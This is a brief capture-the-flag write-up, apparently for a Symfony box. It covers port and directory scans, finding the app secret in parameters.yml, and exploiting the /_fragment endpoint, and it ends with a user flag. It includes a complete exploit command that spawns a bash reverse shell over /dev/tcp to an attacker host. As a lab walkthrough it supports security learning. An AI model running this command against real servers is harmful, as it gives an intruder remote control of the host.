nmap scan

![image](https://user-images.githubusercontent.com/105762605/228873667-dbbd8fc5-07f7-4dad-982f-8772088e444d.png)

dirb scan --- found robots.txt

![image](https://user-images.githubusercontent.com/105762605/228874687-58d63b13-9dcc-40f2-9e59-27cd1919e656.png)

Access robots.txt, app_dev.php

![image](https://user-images.githubusercontent.com/105762605/228874390-91df6a53-dbf6-4fdb-b285-8a99328a1892.png)

Symfony platform is used, found app/config/parameters.yml

![image](https://user-images.githubusercontent.com/105762605/228877123-0a180b72-9f23-4b50-aa4d-13b207437288.png)

Based on https://github.com/ambionics/symfony-exploits/blob/main/secret_fragment_exploit.py and used the key above to reverse the shell

python attack2.py 'http://ip/_fragment' --method 2 --secret 'keys' --algo 'sha256' --internal-url 'http://ip/_fragment' --function system --parameters "bash -c 'bash -i >& /dev/tcp/ip/80 0>&1'"

![image](https://user-images.githubusercontent.com/105762605/228889897-0807e507-0659-484c-a21d-de693cbc9663.png)

Go to dirctory /home/benoit and find first flag: 813365d74b4ffc9f7052e9e888d6396c

![image](https://user-images.githubusercontent.com/105762605/228890553-0dfca038-3a70-4ad5-a2c3-ecee9e1e9489.png)


